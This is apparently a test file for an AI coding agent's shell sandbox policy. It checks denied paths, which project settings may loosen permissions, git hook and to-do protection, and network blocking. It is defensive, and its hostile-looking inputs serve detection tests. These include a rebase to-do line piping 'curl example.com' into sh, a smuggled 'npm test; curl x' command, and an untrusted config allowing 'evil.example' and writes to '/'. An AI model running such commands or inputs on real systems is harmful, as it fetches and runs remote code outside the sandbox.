import { afterEach, expect, test } from "bun:test";
import { mkdir, mkdtemp, realpath, rm, stat, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { loadConfiguration } from "../src/config/load";
import { PRIVATE_PATHS, PROTECTED_WRITE_PATHS } from "../src/platform/project-paths";
import { within } from "../src/platform/project-paths";
import { cachePaths, clangModuleCache, hostListed, REGISTRY_HOSTS, sandboxPolicy, writeFileToOffer, writeFolderToOffer } from "../src/sandbox/policy";
import { SandboxStore } from "../src/sandbox/store";
import { posixOnly } from "./support/platform";
import { waitUntil } from "./support/wait";

/** A temp folder as the policy stores it: resolved, so C:\tmp-fixture on Windows. */
const TMP = path.resolve("/tmp-fixture");

const roots: string[] = [];
afterEach(async () => { await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true }))); });

async function fixture() {
  const base = await realpath(await mkdtemp(path.join(os.tmpdir(), "casper-sandbox-policy-")));
  roots.push(base);
  const home = path.join(base, "home");
  const root = path.join(base, "project");
  await mkdir(path.join(root, ".git", "hooks"), { recursive: true });
  await mkdir(path.join(home, ".casper"), { recursive: true });
  return { base, home, root };
}

test("the policy hides every private place, writes only the project, temp and caches, and keeps git's own files read-only", async () => {
  const { home, root } = await fixture();
  const policy = sandboxPolicy({ root, home, tempDirs: [TMP], platform: "linux" });
  for (const entry of PRIVATE_PATHS) expect(policy.denyRead).toContain(path.join(home, entry));
  expect(policy.denyRead).toContain(path.join(home, ".casper", "projects"));
  for (const entry of [".casper/mcp.json", ".casper/profiles", ".casper/agent/sessions"]) expect(policy.denyRead).toContain(path.join(home, entry));
  expect(policy.denyRead).toContain(path.join(home, ".casper/agent/models.json"));
  const moved = sandboxPolicy({ root, home, tempDirs: [TMP], platform: "linux", agentDir: path.join(home, "elsewhere") }).denyRead;
  for (const name of ["sessions", "models.json"]) expect(moved).toContain(path.join(home, "elsewhere", name));
  expect(policy.allowWrite).toEqual([root, TMP, ...cachePaths("linux").map((entry) => path.join(home, entry))]);
  for (const name of ["hooks", "config", "config.worktree"]) expect(policy.denyWrite).toContain(path.join(root, ".git", name));
  for (const entry of PROTECTED_WRITE_PATHS) expect(policy.denyWrite).toContain(path.join(home, entry));
  expect(policy.allowedDomains).toEqual(expect.arrayContaining([...REGISTRY_HOSTS, "localhost"]));
});

test("on macOS, swift build can write SwiftPM's cache and clang's module cache, but not the rest of ~/Library", async () => {
  const { home, root } = await fixture();
  const policy = sandboxPolicy({ root, home, tempDirs: [TMP], platform: "darwin" });
  expect(policy.allowWrite).toContain(path.join(home, "Library", "Caches", "org.swift.swiftpm"));
  expect(policy.allowWrite).not.toContain(path.join(home, "Library"));
  expect(policy.allowWrite).not.toContain(path.join(home, "Library", "Caches"));
  expect(policy.allowWrite.filter((entry) => within(path.join(home, "Library"), entry)).map((entry) => path.relative(home, entry).split(path.sep).join("/")))
    .toEqual(cachePaths("darwin").filter((entry) => entry.startsWith("Library/")));
  expect(clangModuleCache("darwin", "/var/folders/ab/cd123/T/")).toBe(path.join("/var/folders/ab/cd123/C/clang/ModuleCache"));
  expect(clangModuleCache("darwin", "/tmp", () => undefined)).toBeUndefined();
  // TMPDIR set elsewhere: the user cache folder from getconf.
  expect(clangModuleCache("darwin", "/tmp", () => "/var/folders/ab/cd123/C")).toBe(path.join("/var/folders/ab/cd123/C/clang/ModuleCache"));
  expect(clangModuleCache("linux", "/var/folders/ab/cd123/T")).toBeUndefined();
});

test("a plan turn's policy leaves the project read-only", async () => {
  const { home, root } = await fixture();
  const policy = sandboxPolicy({ root, home, tempDirs: [TMP], platform: "linux", readOnlyProject: true });
  expect(policy.allowWrite).not.toContain(root);
  expect(policy.allowWrite).toContain(TMP);
});

test("folders allowed this session join allowWrite; a deny inside one still wins, and none is offered twice over a deny", async () => {
  const { base, home, root } = await fixture();
  const folder = path.join(base, "app-config");
  await mkdir(path.join(folder, "locked"), { recursive: true });
  const policy = sandboxPolicy({ root, home, tempDirs: [TMP], platform: "linux", sessionWrites: [folder],
    project: { denyWrite: [path.join(folder, "locked")] } });
  expect(policy.allowWrite).toContain(folder);
  expect(policy.denyWrite).toContain(path.join(folder, "locked"));
  const { ShellSandbox } = await import("../src/sandbox/manager");
  const { fakeEngine } = await import("./support/sandbox-fakes");
  const sandbox = new ShellSandbox({ root: () => root, home, engine: fakeEngine(), problem: () => undefined, platform: "linux", tempDirs: [],
    settings: { project: { denyWrite: [path.join(folder, "locked")] } }, askWrite: async () => true });
  expect(await sandbox.decideWrite(folder, "ai")).toBe("allowed");
  expect(sandbox.policy().allowWrite).toContain(folder);
  expect(sandbox.writeAllowed(path.join(folder, "ok.json"))).toBe(true);
  expect(sandbox.writeAllowed(path.join(folder, "locked", "x.json"))).toBe(false);
  // The folder that holds the deny, or sits in it, is never offered.
  expect(sandbox.writeFolder(path.join(folder, "locked", "x.json"))).toBeUndefined();
  expect(sandbox.writeFolder(path.join(folder, "ok.json"))).toBeUndefined();
  await mkdir(path.join(base, "other"));
  expect(sandbox.writeFolder(path.join(base, "other", "new", "deep.json"))).toBe(path.join(base, "other"));
  // The folder above the project holds its git files.
  expect(sandbox.writeFolder(path.join(base, "new.json"))).toBeUndefined();
  expect(sandbox.writeFolder(path.join(root, "src", "a.ts"))).toBeUndefined();
  await sandbox.close();
});

test("a folder allowed this session keeps git's own files read-only, its own and its repos'", async () => {
  const { base, home, root } = await fixture();
  const folder = path.join(base, "code"), repo = path.join(folder, "tool");
  await mkdir(path.join(folder, ".git", "hooks"), { recursive: true });
  await mkdir(path.join(repo, ".git", "hooks"), { recursive: true });
  const policy = sandboxPolicy({ root, home, tempDirs: [TMP], platform: "linux", sessionWrites: [folder] });
  expect(policy.allowWrite).toContain(folder);
  for (const dir of [folder, repo]) for (const own of ["hooks", "config"]) expect(policy.denyWrite).toContain(path.join(dir, ".git", own));
});

test("your own settings add hosts and write folders; a project's settings only add denies", async () => {
  const { home, root } = await fixture();
  await writeFile(path.join(home, ".casper", "config.yaml"), "sandbox:\n  allowedDomains: [api.mist.com]\n  allowWrite: [~/shared-cache]\nshell:\n  keepEnv: [OPENAI_API_KEY]\n");
  await mkdir(path.join(root, ".casper"), { recursive: true });
  await writeFile(path.join(root, ".casper", "project.yaml"), "sandbox:\n  allowedDomains: [evil.example]\n  allowWrite: ['/']\n  denyRead: [secrets]\n  denyWrite: [docs/locked.md]\nshell:\n  keepEnv: [ANTHROPIC_API_KEY]\n");
  const loaded = await loadConfiguration({ projectRoot: root, homeDir: home });
  expect(loaded.sandbox.user).toEqual({ allowedDomains: ["api.mist.com"], allowWrite: ["~/shared-cache"], keepEnv: ["OPENAI_API_KEY"] });
  expect(loaded.sandbox.project).toEqual({ denyRead: ["secrets"], denyWrite: ["docs/locked.md"] });
  expect(loaded.warnings).toEqual(expect.arrayContaining([
    ".casper/project.yaml: sandbox.allowedDomains is ignored; a project can only add denyRead and denyWrite",
    ".casper/project.yaml: sandbox.allowWrite is ignored; a project can only add denyRead and denyWrite",
    ".casper/project.yaml: shell is your own setting (~/.casper/config.yaml); a project can't change it (ignored)",
  ]));
  const policy = sandboxPolicy({ root, home, tempDirs: [], platform: "linux", user: loaded.sandbox.user, project: loaded.sandbox.project });
  expect(policy.allowedDomains).toContain("api.mist.com");
  expect(policy.allowedDomains).not.toContain("evil.example");
  expect(policy.allowWrite).toContain(path.join(home, "shared-cache"));
  expect(policy.allowWrite).not.toContain("/");
  expect(policy.denyRead).toContain(path.join(root, "secrets"));
  expect(policy.denyWrite).toContain(path.join(root, "docs", "locked.md"));
});

test("a project can't turn the sandbox off; you can", async () => {
  const { home, root } = await fixture();
  await mkdir(path.join(root, ".casper"), { recursive: true });
  await writeFile(path.join(root, ".casper", "project.yaml"), "sandbox: off\n");
  const project = await loadConfiguration({ projectRoot: root, homeDir: home });
  expect(project.sandbox.user.off).toBeUndefined();
  expect(project.warnings).toContain(".casper/project.yaml: sandbox: off is ignored; a project can't turn the sandbox off, only add denyRead and denyWrite");
  await writeFile(path.join(home, ".casper", "config.yaml"), "sandbox: off\n");
  expect((await loadConfiguration({ projectRoot: root, homeDir: home })).sandbox.user.off).toBe(true);
});

test("host patterns match a wildcard's subdomains, never the bare domain or a lookalike", () => {
  expect(hostListed("a.githubusercontent.com", ["*.githubusercontent.com"])).toBe(true);
  expect(hostListed("githubusercontent.com", ["*.githubusercontent.com"])).toBe(false);
  expect(hostListed("evilgithubusercontent.com", ["*.githubusercontent.com"])).toBe(false);
  expect(hostListed("API.Mist.com.", ["api.mist.com"])).toBe(true);
});

posixOnly("remembered hosts live in Casper's own folder, private, and never in the repo", async () => {
  const { home, root } = await fixture();
  const directory = path.join(home, ".casper", "projects", "project-1");
  const store = new SandboxStore(directory);
  await store.addHost("API.mist.com");
  await store.addCommand("npm test");
  expect((await stat(store.file)).mode & 0o777).toBe(0o600);
  expect(await new SandboxStore(directory).hosts()).toEqual(["api.mist.com"]);
  expect(await new SandboxStore(directory).hasCommand("npm test")).toBe(true);
  expect(await new SandboxStore(directory).hasCommand("npm test; curl x")).toBe(false);
  expect(await store.forgetHost("api.mist.com")).toBe(true);
  expect(await new SandboxStore(directory).hosts()).toEqual([]);
  await expect(stat(path.join(root, ".casper"))).rejects.toThrow();
});

test("Casper's own bubblewrap line runs the command through the seccomp helper, so it can't open a Unix socket", async () => {
  const { bwrapArgs } = await import("../src/sandbox/linux");
  const policy = { allowWrite: [], denyWrite: [], denyRead: [], allowedDomains: [] };
  for (const network of ["host", "none"] as const) {
    const args = bwrapArgs({ policy, network, cwd: "/", seccomp: "/opt/apply-seccomp" }, "echo hi");
    const end = args.indexOf("--", args.indexOf("--chdir"));
    expect(args.slice(end + 1, end + 4)).toEqual(["/opt/apply-seccomp", "/bin/sh", "-c"]);
  }
});

test("a worktree's .git file and its folder's commondir are read-only, and so are git's files in a new project's folder", async () => {
  const { base, home, root } = await fixture();
  const main = path.join(base, "main-git");
  const linked = path.join(main, "worktrees", "tree");
  await mkdir(path.join(main, "hooks"), { recursive: true });
  await mkdir(linked, { recursive: true });
  await writeFile(path.join(linked, "commondir"), "../..\n");
  const tree = path.join(base, "tree");
  await mkdir(tree, { recursive: true });
  await writeFile(path.join(tree, ".git"), `gitdir: ${linked}\n`);
  const policy = sandboxPolicy({ root: tree, home, tempDirs: [], platform: "linux" });
  expect(policy.denyWrite).toEqual(expect.arrayContaining([path.join(tree, ".git"), path.join(linked, "commondir"), path.join(main, "hooks"), path.join(main, "config")]));
  // A main .git has no commondir: nothing stands in for it (a stand-in breaks git); the sandbox watches for one instead.
  expect(sandboxPolicy({ root, home, tempDirs: [], platform: "linux" }).denyWrite).not.toContain(path.join(root, ".git", "commondir"));
  const fresh = path.join(base, "fresh");
  await mkdir(path.join(fresh, ".git", "hooks"), { recursive: true });
  const withNew = sandboxPolicy({ root, home, tempDirs: [], platform: "linux", extraWrite: [fresh] });
  expect(withNew.allowWrite).toContain(fresh);
  for (const name of ["hooks", "config", "info"]) expect(withNew.denyWrite).toContain(path.join(fresh, ".git", name));
});

test("a submodule's own git folder and the .git file that points at it are read-only, nested ones too", async () => {
  const { home, root } = await fixture();
  const lib = path.join(root, ".git", "modules", "lib");
  const nested = path.join(lib, "modules", "deep");
  const slashed = path.join(root, ".git", "modules", "vendor", "one");
  for (const dir of [lib, nested, slashed]) {
    await mkdir(dir, { recursive: true });
    await writeFile(path.join(dir, "HEAD"), "ref: refs/heads/main\n");
  }
  await writeFile(path.join(root, ".gitmodules"), '[submodule "lib"]\n\tpath = lib\n\turl = ../lib\n[submodule "gone"]\n\tpath = ../../outside\n');
  await mkdir(path.join(root, "lib"), { recursive: true });
  await writeFile(path.join(root, "lib", ".git"), "gitdir: ../.git/modules/lib\n");
  const policy = sandboxPolicy({ root, home, tempDirs: [], platform: "linux" });
  for (const dir of [lib, nested, slashed]) for (const name of ["hooks", "config", "config.worktree", "info"]) expect(policy.denyWrite).toContain(path.join(dir, name));
  expect(policy.denyWrite).toContain(path.join(root, "lib", ".git"));
  // A submodule path that leads out of the project is not followed.
  expect(policy.denyWrite.some((entry) => entry.includes("outside"))).toBe(false);
  expect(policy.denyWrite).not.toContain(path.join(root, ".git", "modules", "vendor", "hooks"));
});

test("a commondir a command writes into the project's .git is removed at once and said; one you had stays", async () => {
  const { ShellSandbox } = await import("../src/sandbox/manager");
  const { passThroughEngine } = await import("../src/sandbox/runtime");
  const { home, root } = await fixture();
  const notes: string[] = [];
  const sandbox = new ShellSandbox({ root: () => root, home, tempDirs: [], platform: "linux", engine: passThroughEngine(), problem: () => undefined, note: (line) => notes.push(line) });
  const removed = `a command wrote it, and it would point git at another folder's settings and hooks.`;
  const pointer = path.join(root, ".git", "commondir");
  const exists = () => stat(pointer).then(() => true, () => false);
  // While a command runs, the folder is watched. macOS can drop an event that comes just after its watch starts,
  // so the watch is checked where it is live at once (Linux, Windows).
  if (process.platform !== "darwin") {
    await sandbox.wrap("true", { cwd: root });
    await writeFile(pointer, "../elsewhere\n");
    expect(await waitUntil(async () => !await exists())).toBe(true);
    expect(notes).toEqual([`[sandbox] Removed ${pointer}: ${removed}`]);
    notes.length = 0;
  }
  // When the command that wrote it ends, it is gone, watched or not.
  const run = await sandbox.wrap("true", { cwd: root });
  await writeFile(pointer, "../elsewhere\n");
  sandbox.finished(run.id);
  expect(await exists()).toBe(false);
  expect(notes).toEqual([`[sandbox] Removed ${pointer}: ${removed}`]);
  await sandbox.close();

  const { root: yours, home: home2 } = await fixture();
  await writeFile(path.join(yours, ".git", "commondir"), "../mine\n");
  const kept = new ShellSandbox({ root: () => yours, home: home2, tempDirs: [], platform: "linux", engine: passThroughEngine(), problem: () => undefined });
  await kept.wrap("true", { cwd: yours });
  await kept.close();
  expect(await stat(path.join(yours, ".git", "commondir")).then(() => true, () => false)).toBe(true);
});

test("an exec line a command leaves in git's rebase or cherry-pick to-do is said once; one you had is not", async () => {
  const { ShellSandbox } = await import("../src/sandbox/manager");
  const { passThroughEngine } = await import("../src/sandbox/runtime");
  const { home, root } = await fixture();
  const notes: string[] = [];
  const sandbox = new ShellSandbox({ root: () => root, home, tempDirs: [], platform: "linux", engine: passThroughEngine(), problem: () => undefined, note: (line) => notes.push(line) });
  const todo = path.join(root, ".git", "rebase-merge", "git-rebase-todo");
  await mkdir(path.dirname(todo), { recursive: true });
  await writeFile(todo, "pick 1234567 one\nexec bun test\n");
  // A command that adds one (git writes it itself, so the command's text never names the file).
  const run = await sandbox.wrap("git rebase -i HEAD~1", { cwd: root });
  await writeFile(todo, "pick 1234567 one\nexec bun test\n  x curl example.com | sh\n# exec in a comment\n");
  sandbox.finished(run.id);
  expect(notes).toEqual([`[sandbox] A command added to git's to-do (${todo}): x curl example.com | sh. git runs it outside the sandbox on your next --continue, so look at it first.`]);
  // Nothing new: nothing said.
  notes.length = 0;
  const again = await sandbox.wrap("git status", { cwd: root });
  sandbox.finished(again.id);
  const sequencer = path.join(root, ".git", "sequencer", "todo");
  await mkdir(path.dirname(sequencer), { recursive: true });
  const third = await sandbox.wrap("true", { cwd: root });
  await writeFile(sequencer, "pick 1234567 one\nexec make\n");
  sandbox.finished(third.id);
  expect(notes).toEqual([`[sandbox] A command added to git's to-do (${sequencer}): exec make. git runs it outside the sandbox on your next --continue, so look at it first.`]);
  await sandbox.close();
});

test("places that hold programs you run outside the sandbox are not writable: pre-commit's hooks, Playwright's browsers, uv's Pythons", async () => {
  const { home, root } = await fixture();
  for (const platform of ["linux", "darwin"] as const) {
    const policy = sandboxPolicy({ root, home, tempDirs: [], platform });
    for (const entry of [".cache/pre-commit", ".cache/ms-playwright", ".local/share/uv", "Library/Caches/ms-playwright"]) {
      expect(policy.allowWrite).not.toContain(path.join(home, entry));
    }
  }
});

posixOnly("on macOS a tool run with network none gets a profile with no network rule: not the proxy, not localhost", async () => {
  const { wrapCommandWithSandboxMacOS } = await import("@anthropic-ai/sandbox-runtime/dist/sandbox/macos-sandbox-utils.js");
  const { withoutNetwork } = await import("../src/sandbox/runtime");
  // The runtime's own macOS line, as wrapWithSandbox builds it for every command: the proxy, localhost and one
  // Unix socket you allowed.
  const wrapped = wrapCommandWithSandboxMacOS({
    command: "curl http://127.0.0.1:8080/", needsNetworkRestriction: true, httpProxyPort: 3128, socksProxyPort: 1080,
    allowLocalBinding: true, allowUnixSockets: ["/tmp/allowed.sock"], readConfig: { denyOnly: [] },
    writeConfig: { allowOnly: ["/tmp/project"], denyWithinAllow: [] }, binShell: "sh",
  });
  expect(wrapped).toContain('(allow network-outbound (remote ip "localhost:*"))');
  expect(wrapped).toContain('(allow network-outbound (remote ip "localhost:3128"))');
  const none = withoutNetwork(wrapped);
  expect(none).not.toMatch(/\(allow network[^\n]* ip "/);
  expect(none).toContain("(deny default");
  expect(none).toContain('(allow network-outbound (remote unix-socket (subpath "/tmp/allowed.sock")))');
  expect(none).toContain("; File read");
  expect(none).toContain("curl http://127.0.0.1:8080/");
  // A line it can't read is refused, never run with the network.
  expect(() => withoutNetwork("sh -c 'curl example.com'")).toThrow("can't be kept off the network");
});

test("a store moved with CASPER_AGENT_DIR is read-only to commands, like ~/.casper; never home or the project itself", async () => {
  const { base, home, root } = await fixture();
  const agentDir = path.join(base, "agent-store");
  await mkdir(path.join(agentDir, "sessions"), { recursive: true });
  const policy = sandboxPolicy({ root, home, agentDir, tempDirs: [TMP], platform: "linux" });
  expect(policy.denyWrite).toContain(agentDir);
  expect(policy.denyRead).toContain(path.join(agentDir, "auth.json"));
  expect(writeFolderToOffer(path.join(agentDir, "settings.json"), policy, { root, home })).toBeUndefined();
  expect(writeFileToOffer(path.join(agentDir, "sessions", "s.jsonl"), policy, { root, home })).toBeUndefined();
  for (const odd of [home, base, path.parse(base).root]) {
    expect(sandboxPolicy({ root, home, agentDir: odd, tempDirs: [TMP], platform: "linux" }).denyWrite).not.toContain(odd);
  }
});

test("Claude Code's debug folder, which the sandbox runtime would let commands write, is not writable", async () => {
  const { home, root } = await fixture();
  expect(sandboxPolicy({ root, home, tempDirs: [TMP], platform: "darwin" }).denyWrite).toContain(path.join(home, ".claude", "debug"));
});
